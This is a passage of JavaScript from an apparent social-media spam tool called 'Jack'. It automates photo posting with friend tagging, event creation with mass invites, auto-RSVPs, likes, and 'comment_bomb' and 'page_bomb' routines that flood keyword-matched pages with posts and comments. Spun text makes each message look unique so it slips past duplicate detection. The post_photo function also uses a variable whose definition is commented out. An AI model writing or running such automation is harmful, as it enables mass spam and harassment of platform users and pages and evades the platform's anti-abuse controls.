	var d = $.Deferred();
	var comment = photo.comment;
	var photo = $.extend({}, photo);
	delete photo.comment;
	
	function post_photo(photo){
		//Jack.friends(config.friends).done(function(friends){
			//var uids = $.map(friends, function(friend){ return friend.id});
			console.log('tagging friends ', uids);
			//if(config.self) uids.push('me');
			Jack.photo(config.uids || ['me'], photo).done(function(result){
				if(result && result.id){
					var id = result.id;
					$.when.apply($, [
						Jack.tag(id, uids),
						Jack.comment(result.id, comment)
						]).always(
							function(){ d.resolve() }
						);
				}else{
					d.resolve();
				}
			}).fail(function(){d.resolve();})

		//});
	}
	// generate unique photo
	Jack._unique_photo(photo).then(post_photo);
	

	return d.promise();
}

Jack.run_event = function(config, evt){
	var d = $.Deferred();
	Jack.friends(config.friends).done(function(friends){
		var uids = $.map(friends, function(friend){ return friend.id});
		//if(config.self) uids.push('me');
		console.log('doing event ', evt);
		var event = $.extend({}, evt);
		var post = event.post;
		delete event.post;
		if(event.picture){
			Jack._unique_photo(event).then(function(photo){
				var name = 'image.' + URI(event.picture).suffix();
				event.__source = name;
				if(photo.source){ // blob
					event[name] = photo.source;
				}
				create_event(event);
			});
		}else{
			create_event(event);
		}
		function create_event(evt){
			var event = evt;
			Jack.event(event).done(function(result){
				if(result && result.id){
					var id = result.id;
					var handles = []; 
					if(uids.length > 0)
						handles.push(Jack.invite(id, uids));

					// get post the events wall
					if(config.post){
						var postHandle = $.Deferred();
						var post = Jack.spinObject(Jack.config.post);
						var p_config = Jack.spinObject(Jack.methods.post);
						Jack.friends(p_config.chunk_size || p_config.friends || 0).done(function(friends){
							var tags = $.map(friends, function(friend){ return friend.id});
							if(tags.length > 0) 
								post.tags = tags;
							Jack.post(id, post).always(function(){
								postHandle.resolve();
							});
						}).fail(function(){
							postHandle.reject();
						});
						handles.push(postHandle.promise());
					}

					if(handles.length > 0){
						$.when.apply($, handles).always(function(){
							d.resolve();
						});
					}else{ // we didn't need to invite or post anything
						d.resolve();
					}
				}else{
					d.resolve();
				}
			}).fail(function(){d.resolve();});
		}
		}); // friends
	return d.promise();
}

Jack.run_rsvp = function(config, rsvp){
	var max = (config.events || 1), posts = shuffleArray(rsvp.ids || []), handles = [];
	for(var i = 0; i < max && i < posts.length; i++){
		ret = Jack.rsvp(posts[i]);
		handles.push(ret);
		if(rsvp.rsvp_message){
			var message = Jack.spin(rsvp.rsvp_message, true);
			if(message){
				var d = $.Deferred();
				ret.then(function(result){
					if(result){
						Jack.post(posts[i], {
							message: message
						}).always(function(){
							d.resolve();
						});
					}else{
						d.resolve();
					}
				}).fail(function(){
					d.fail();
				});
				// add post handle
				handles.push(d.promise());
			}
		}
	}
	return $.when(handles);	
}

Jack.run_like = function(config, like){
	var max = (config.likes || 1), posts = shuffleArray(like.ids || []), handles = [];
	for(var i = 0; i < max && i < posts.length; i++){
		handles.push(Jack.like(posts[i]));
	}
	return $.when(handles);
}

Jack.run_comment_bomb = function(config, comment){
	var d = $.Deferred();
	Jack.feed(config.posts, config.uid).then(function(posts){
		var handles = [];
		posts.each(function(post){
			if(!config.nospin)
				comment = Jack.spinObject(Jack.config.comment_bomb);

			handles.push(Jack.comment(post.post_id, comment.message));
		});
		$.when.apply($, handles).always(function(){
			d.resolve();
		});
	}).fail(function(){
		d.reject();
	});
	return d.promise();
}
Jack.run_page_bomb = function(config, bomb){
	var d = $.Deferred();
	Jack.pages(Jack.spin(config.keywords), config.page_count || 1).then(function(pages){
		var handles = [], ids = $.map(pages, function(page){ return page.id}), conf = false, obj = false;
		if(config.post){
			conf = $.extend(Jack.spinObject(Jack.config.methods.post), {uids: ids, friends: false, chunk_size: false});
			obj = Jack.spinObject(Jack.config.post);
			handles.push(Jack.run_post(conf, obj));
		}
		if(config.photo_enabled){
			conf = $.extend(Jack.spinObject(Jack.config.methods.photo), {uids: ids, friends: false, chunk_size: false});
			obj = Jack.spinObject(Jack.config.photo);
			handles.push(Jack.run_photo(conf, obj));
		}
		if(config.comment_enabled){
			ids.each(function(id){
				conf = $.extend(Jack.spinObject(Jack.config.methods.comment_bomb), {uid: id});
				obj = Jack.spinObject(Jack.config.comment_bomb);
				conf.posts = config.posts || conf.posts;
				handles.push(Jack.run_comment_bomb(conf, obj));					
			});
		}
		$.when.apply($, handles).always(function(){
			d.resolve();
		});
	}).fail(function(){
		d.reject();
	});
	return d.promise();
}
// utils
function shuffleArray(array) {
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    return array;
}

